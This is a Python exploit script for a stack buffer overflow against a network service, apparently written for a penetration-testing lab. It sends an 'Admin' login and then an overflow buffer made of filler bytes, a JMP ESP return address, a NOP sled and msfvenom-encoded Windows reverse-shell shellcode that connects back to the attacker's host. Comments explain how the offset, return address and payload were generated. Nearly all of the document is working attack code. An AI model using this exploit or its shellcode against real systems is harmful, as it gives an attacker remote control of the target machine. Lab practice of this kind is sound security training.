#!python3 

import socket, sys, time

ip = "127.0.0.1" # change this to correct ip
port = 4444      # change this to correct port for target file

filler = "A" * 1028     #found w msf-pattern_create -l 1450 ; sf-pattern_offset -l 1450 -q 33694232
retn = "\x73\x6d\x47\x10"   #This is the return jump point address: found w !mona jmp -r esp -cpb <"bad chars found">  
NOP = "\x90" * 16

# payload_W is my windows payload:  msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=4477 -b "\x00" -f c -e x86/shikata_ga_nai
payload_W= ("\xbb\x97\x70\x4e\xba\xda\xdd\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x52\x31\x5a\x12\x83\xc2\x04\x03\xcd\x7e\xac\x4f\x0d"
"\x96\xb2\xb0\xed\x67\xd3\x39\x08\x56\xd3\x5e\x59\xc9\xe3"
"\x15\x0f\xe6\x88\x78\xbb\x7d\xfc\x54\xcc\x36\x4b\x83\xe3"
"\xc7\xe0\xf7\x62\x44\xfb\x2b\x44\x75\x34\x3e\x85\xb2\x29"
"\xb3\xd7\x6b\x25\x66\xc7\x18\x73\xbb\x6c\x52\x95\xbb\x91"
"\x23\x94\xea\x04\x3f\xcf\x2c\xa7\xec\x7b\x65\xbf\xf1\x46"
"\x3f\x34\xc1\x3d\xbe\x9c\x1b\xbd\x6d\xe1\x93\x4c\x6f\x26"
"\x13\xaf\x1a\x5e\x67\x52\x1d\xa5\x15\x88\xa8\x3d\xbd\x5b"
"\x0a\x99\x3f\x8f\xcd\x6a\x33\x64\x99\x34\x50\x7b\x4e\x4f"
"\x6c\xf0\x71\x9f\xe4\x42\x56\x3b\xac\x11\xf7\x1a\x08\xf7"
"\x08\x7c\xf3\xa8\xac\xf7\x1e\xbc\xdc\x5a\x77\x71\xed\x64"
"\x87\x1d\x66\x17\xb5\x82\xdc\xbf\xf5\x4b\xfb\x38\xf9\x61"
"\xbb\xd6\x04\x8a\xbc\xff\xc2\xde\xec\x97\xe3\x5e\x67\x67"
"\x0b\x8b\x28\x37\xa3\x64\x89\xe7\x03\xd5\x61\xed\x8b\x0a"
"\x91\x0e\x46\x23\x38\xf5\x01\x46\xb7\xfb\xc1\x3e\xc5\x03"
"\xf3\xc3\x40\xe5\x99\x2b\x05\xbe\x35\xd5\x0c\x34\xa7\x1a"
"\x9b\x31\xe7\x91\x28\xc6\xa6\x51\x44\xd4\x5f\x92\x13\x86"
"\xf6\xad\x89\xae\x95\x3c\x56\x2e\xd3\x5c\xc1\x79\xb4\x93"
"\x18\xef\x28\x8d\xb2\x0d\xb1\x4b\xfc\x95\x6e\xa8\x03\x14"
"\xe2\x94\x27\x06\x3a\x14\x6c\x72\x92\x43\x3a\x2c\x54\x3a"
"\x8c\x86\x0e\x91\x46\x4e\xd6\xd9\x58\x08\xd7\x37\x2f\xf4"
"\x66\xee\x76\x0b\x46\x66\x7f\x74\xba\x16\x80\xaf\x7e\x26"
"\xcb\xed\xd7\xaf\x92\x64\x6a\xb2\x24\x53\xa9\xcb\xa6\x51"
"\x52\x28\xb6\x10\x57\x74\x70\xc9\x25\xe5\x15\xed\x9a\x06"
"\x3c")

buffer = filler + retn + NOP + payload_W  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
        Access_name= "Admin"
        s.connect((ip, port))
        response = s.recv(1024)  # Receive up to 1024 bytes
        if response:
            print(f"Server says: {response.decode('latin-1')}")

        print(f"Sending Access name of {Access_name}...")
        s.send(bytes(Access_name + "\r\n", "latin-1"))
        response = s.recv(1024)  # Receive up to 1024 bytes
        if response:
            print(f"Server says: {response.decode('latin-1')}")
        print("Sending evil buffer...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("Done!")
except:
        print("Could not connect.")